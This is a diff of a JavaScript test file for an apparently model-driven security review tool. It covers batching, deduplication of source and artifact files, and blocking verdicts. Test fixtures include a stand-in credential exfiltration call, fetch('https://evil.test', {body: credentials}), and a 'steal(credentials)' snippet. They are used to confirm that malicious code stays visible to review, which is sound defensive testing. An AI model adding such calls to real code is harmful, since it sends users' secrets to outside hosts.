@@ -260,7 +260,7 @@ test('retains executable tests and complete dependency bundles while preserving 
   } finally { await fs.rm(directory, { recursive: true, force: true }) }
 })
 
-test('retains identical installed artifact text for independent complete batch validation', async () => {
+test('deduplicates only complete identical artifact text with explicit source and install provenance', async () => {
   const bytes = await packageBytes()
   let promptEvidence
   const sha256 = crypto.createHash('sha256').update(bytes).digest('hex')
@@ -277,9 +277,11 @@ test('retains identical installed artifact text for independent complete batch v
     }
   })
   assert.equal(result.passed, true)
-  const artifactClient = promptEvidence.find(e => e.file === 'artifact/client.js')
-  assert.ok(artifactClient)
-  assert.equal(artifactClient.text, '[L1] register business panel')
+  const sourceClient = promptEvidence.find(e => e.file === 'source/client.js')
+  assert.ok(sourceClient)
+  assert.equal(sourceClient.text, '[L1] register business panel')
+  assert.deepEqual(sourceClient.identicalFiles, ['source/client.js','artifact/client.js'])
+  assert.equal(sourceClient.contentSha256, crypto.createHash('sha256').update('register business panel').digest('hex'))
 })
 
 
@@ -297,7 +299,7 @@ test('large one-line bundled code is completely covered, overlapping, bounded an
   }
   assert.equal(covered,text.length)
   assert.ok(chunks.some(item=>item.text.includes('fetch("https://evil.test", {body: credentials})')))
-  for(const batch of batches) assert.ok(JSON.stringify(batch.prompt).length<=300000)
+  for(const batch of batches) assert.ok(JSON.stringify(batch.prompt).length<=150000)
 })
 
 test('any blocking chunk prevents aggregated approval; incomplete and transport failure cannot pass', () => {
@@ -311,9 +313,9 @@ test('any blocking chunk prevents aggregated approval; incomplete and transport 
 
 
 test('unbounded batch count and shared context fail before any model request', () => {
-  const files=Array.from({length:161},(_,i)=>({file:`artifact/${i}.js`,text:'a'.repeat(190000)}))
+  const files=Array.from({length:161},(_,i)=>({file:`artifact/${i}.js`,text:`${i}`+'a'.repeat(190000)}))
   assert.throws(()=>createReviewBatches(files), /80 个分块/)
-  const context=Array.from({length:10},(_,i)=>({file:`submission/${i}`,text:'a'.repeat(20000)}))
+  const context=Array.from({length:10},(_,i)=>({file:`submission/${i}`,text:`${i}`+'a'.repeat(20000)}))
   assert.throws(()=>createReviewBatches(context), /共享审核上下文/)
 })
 
@@ -335,4 +337,21 @@ test('a validated blocking wave survives a concurrent transport error without be
  assert.equal(reports.length,1); assert.deepEqual(reports[0].criteria[0].evidence,blocked.criteria[0].evidence)
  assert.equal(mergeBatchReviews(reports).passed,false)
  assert.throws(()=>collectReviewWave([{status:'fulfilled',value:validateReview(verdict(),evidence)},results[1]]), /transport incomplete/)
+})
+
+
+test('whole-file dedup never merges unequal source and artifact text or matching prefixes', () => {
+ const files=[{file:'source/client.js',text:'register business panel'}, {file:'artifact/client.js',text:'register business panel; steal(credentials)'}, {file:'artifact/copy.js',text:'register business panel'}]
+ const batches=createReviewBatches(files)
+ const items=batches.flatMap(batch=>batch.prompt)
+ assert.ok(items.some(item=>item.file==='artifact/client.js'&&item.text.includes('steal(credentials)')))
+ assert.deepEqual(items.find(item=>item.file==='source/client.js').identicalFiles,['source/client.js','artifact/copy.js'])
+})
+
+test('invalid UTF-8 text is rejected before byte-identical deduplication', async () => {
+ const root=await fs.mkdtemp(path.join(os.tmpdir(),'review-invalid-utf8-'))
+ try {
+  await fs.writeFile(path.join(root,'client.js'),Buffer.from([0xff,0x41]))
+  await assert.rejects(()=>readEvidenceDirectory(root),/二进制/)
+ } finally {await fs.rm(root,{recursive:true,force:true})}
 })
